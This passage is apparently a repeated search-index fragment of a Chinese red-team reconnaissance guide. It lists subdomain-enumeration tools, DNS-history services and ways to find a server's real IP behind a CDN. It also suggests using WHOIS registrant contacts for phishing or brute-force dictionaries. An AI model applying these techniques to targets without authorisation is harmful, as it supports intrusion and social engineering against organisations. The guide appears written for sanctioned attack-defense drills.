","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:7","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x07-whois-查询"},{"categories":["hvv"],"content":"\r0x08 在线网站备案查询 名称 地址 小蓝本 https://www.xiaolanben.com/ 天眼查 https://www.tianyancha.com/ ICP备案查询网 http://www.beianbeian.com/ 爱站备案查询 https://icp.aizhan.com 域名助手备案信息查询 http://cha.fute.com/index 企查查 https://www.qcc.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:8","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x08-在线网站备案查询"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x09-查找真实ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#1-多地ping"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#2-nslookup"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#3-dns-历史查询"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 